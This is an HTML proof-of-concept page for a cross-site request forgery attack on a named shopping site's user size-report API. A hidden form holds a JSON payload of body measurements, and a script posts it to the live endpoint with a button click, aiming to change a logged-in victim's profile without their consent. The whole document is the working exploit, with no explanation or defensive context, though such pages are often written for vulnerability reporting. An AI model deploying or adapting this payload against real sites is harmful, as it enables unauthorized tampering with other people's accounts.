<!DOCTYPE html>
<html>
<head>
  <title>CSRF PoC - Size Report</title>
</head>
<body>
  <h2>CSRF PoC - Manual Submit</h2>
  <form id="csrfForm" method="POST" action="https://www.temu.com/api/bg-barbera-api/user/size/report" target="hiddenFrame">
    <textarea name="json" style="display:none;">
      {
        "bust_size": 60.152,
        "size_unit": "IN",
        "waist_size": 50.761,
        "hip_size": 60.152,
        "height": 50.508,
        "weight": 25.079,
        "trp_track": null
      }
    </textarea>
    <button type="button" onclick="submitCSRF()">Submit CSRF</button>
  </form>

  <iframe name="hiddenFrame" style="display:none;"></iframe>

  <script>
    function submitCSRF() {
      const form = document.getElementById('csrfForm');
      const xhr = new XMLHttpRequest();
      xhr.open("POST", form.action, true);
      xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
      xhr.send(form.querySelector('textarea').value);
    }
  </script>
</body>
</html>
